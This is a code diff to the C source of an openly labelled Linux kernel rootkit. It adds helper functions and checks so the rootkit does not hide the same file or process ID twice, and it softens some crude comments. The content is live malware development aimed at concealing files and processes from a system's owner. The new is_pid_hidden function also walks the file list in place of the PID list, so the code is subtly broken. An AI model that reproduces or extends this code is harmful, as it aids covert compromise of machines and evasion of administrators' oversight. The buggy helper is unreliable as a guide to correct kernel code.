@@ -378,8 +378,22 @@ void hooks_exit(void){
 	}
 }
 
-// HIDE THOSE FKING FILES
+// HIDE THOSE FILES
+int is_file_hidden(const char* name){
+	struct list_files_node* node;
+	list_for_each_entry(node, &list_files, list){
+		if (strcmp(node->name, name) == 0)
+			return 1;
+	}
+	return 0;
+}
+
 int hide_file(const char* name){
+	if (is_file_hidden(name)){
+		printk(KERN_INFO "ROOTKIT: ERROR trying to hide already hidden file %s\n", name);
+		return -1;
+	}
+
 	struct list_files_node* node = kmalloc(sizeof(struct list_files_node), GFP_KERNEL);
 	if (node == NULL){
 		printk(KERN_INFO "ROOTKIT: ERROR allocating node for hiding file %s\n", name);
@@ -414,8 +428,22 @@ int unhide_file(const char* name){
 	return -1;
 }
 
-// HIDE THOSE FKING PIDS
+// HIDE THOSE PIDS
+int is_pid_hidden(int pid){
+	struct list_pids_node* node;
+	list_for_each_entry(node, &list_files, list){
+		if (node->pid == pid)
+			return 1;
+	}
+	return 0;
+}
+
 int hide_pid(int pid){
+	if (is_pid_hidden(pid)){
+		printk(KERN_INFO "ROOTKIT: ERROR trying to hide already hidden pid %d\n", pid);
+		return -1;
+	}
+
 	struct list_pids_node* node = kmalloc(sizeof(struct list_pids_node), GFP_KERNEL);
 	if (node == NULL){
 		printk(KERN_INFO "ROOTKIT: ERROR allocating node for hiding pid %d\n", pid);
